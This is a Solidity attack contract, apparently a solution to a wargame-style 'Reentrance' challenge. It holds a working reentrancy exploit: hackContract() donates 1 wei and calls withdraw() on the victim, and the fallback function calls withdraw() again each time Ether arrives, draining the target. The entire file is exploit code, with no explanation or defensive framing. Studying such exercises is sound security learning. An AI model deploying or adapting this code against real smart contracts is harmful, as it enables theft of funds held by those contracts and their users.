// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public victim;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        victim = Reentrance(_contractAddress);
    }

    fallback() external payable {
        console.log("fallback");
        victim.withdraw();
    }

    function hackContract() external {
        victim.donate{value: 1}(address(this));
        victim.withdraw();
    }
}
